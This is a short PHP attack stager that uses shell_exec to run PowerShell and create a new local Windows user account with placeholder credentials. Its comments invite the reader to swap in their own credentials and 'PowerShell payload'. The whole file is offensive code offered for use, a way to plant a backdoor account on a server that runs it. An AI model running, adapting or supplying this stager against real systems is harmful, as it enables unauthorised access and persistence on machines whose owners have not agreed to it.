<?php
  function compile_stager() {
    $user = "user"; // Change this
    $pass = "password"; // Change this
    $init = "powershell.exe";
    $payload = "\$secure = ConvertTo-SecureString \"$pass\" -AsPlainText -Force; New-LocalUser \"$user\" -Password \$secure;"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }

  compile_stager();
?>
